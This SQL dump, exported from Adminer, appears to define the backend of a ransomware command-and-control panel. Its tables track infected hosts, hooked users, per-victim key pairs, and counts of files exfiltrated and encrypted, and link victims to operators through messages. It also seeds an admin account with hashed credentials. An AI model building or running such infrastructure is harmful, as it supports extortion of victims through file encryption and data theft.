-- Adminer 4.8.1 MySQL 5.5.5-10.11.2-MariaDB-1:10.11.2+maria~ubu2204 dump

SET NAMES utf8;
SET time_zone = '+00:00';
SET foreign_key_checks = 0;
SET sql_mode = 'NO_AUTO_VALUE_ON_ZERO';

SET NAMES utf8mb4;

CREATE DATABASE `CTHULHU` /*!40100 DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci */;
USE `CTHULHU`;

DROP TABLE IF EXISTS `agent`;
CREATE TABLE `agent` (
  `agentID` int(255) NOT NULL AUTO_INCREMENT,
  `ip` varchar(20) DEFAULT NULL,
  `host` varchar(50) NOT NULL,
  `versionOS` varchar(30) NOT NULL,
  `hookUser` varchar(50) NOT NULL,
  `hookDate` timestamp DEFAULT current_timestamp(),
  `privKey` TEXT NOT NULL,
  `pubKey` TEXT NOT NULL,
  `pathToData` varchar(255) DEFAULT NULL,
  `country` char(50) DEFAULT NULL,
  `totalFilesSend` int(255) DEFAULT NULL,
  `totalFilesEncrypt` int(255) DEFAULT NULL,
  PRIMARY KEY (`agentID`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;


DROP TABLE IF EXISTS `message`;
CREATE TABLE `message` (
  `messageID` int(255) NOT NULL AUTO_INCREMENT,
  `ownerType` int(1) NOT NULL,
  `message` text NOT NULL,
  `messageDate` timestamp NOT NULL,
  `agent` int(255) NOT NULL,
  `operator` int(255) NOT NULL,
  PRIMARY KEY (`messageID`),
  KEY `agent` (`agent`),
  KEY `operator` (`operator`),
  CONSTRAINT `message_ibfk_1` FOREIGN KEY (`agent`) REFERENCES `agent` (`agentID`),
  CONSTRAINT `message_ibfk_2` FOREIGN KEY (`operator`) REFERENCES `operator` (`operatorID`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;


DROP TABLE IF EXISTS `roles`;
CREATE TABLE `roles` (
  `role_id` int NOT NULL AUTO_INCREMENT,
  `role_name` varchar(191) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  PRIMARY KEY (`role_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

INSERT INTO `roles` (`role_id`, `role_name`) VALUES
(1,	'admin'),
(2,	'reader'),
(3,	'scan');

DROP TABLE IF EXISTS `users`;
CREATE TABLE `users` (
  `user_id` int NOT NULL AUTO_INCREMENT,
  `user_firstname` varchar(191) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `user_lastname` varchar(191) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `user_name` varchar(191) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `user_email` varchar(191) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `user_password` varchar(191) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `user_token` varchar(191) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `role_id` int DEFAULT NULL,
  PRIMARY KEY (`user_id`),
  UNIQUE KEY `users_user_email_key` (`user_email`),
  KEY `users_role_id_key` (`role_id`),
  CONSTRAINT `users_role_id_fkey` FOREIGN KEY (`role_id`) REFERENCES `roles` (`role_id`) ON DELETE RESTRICT ON UPDATE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

INSERT INTO `users` (`user_id`, `user_firstname`, `user_lastname`, `user_name`, `user_email`, `user_password`, `user_token`, `role_id`) VALUES
(1,	'admin',	'admin',	'admin',	'admin@test.com',	'bf3f8aaab1c31a4c41a4004cb1258f9d528f98c289b95f22122befaca99162b4eef015d36e38aac71157a87fde783ebcf5fb6b076e9227a91c78574699bd0494',	'9cdc8579fcfe2ffbe2fc3d2ca61204c7122d391d31e49ead45ab48f208fd8c2775abb2e0400565443520aad76b94165b9d7b1aaa1322dcb068d2add549ecb539',	1);



-- 2023-05-02 12:41:50
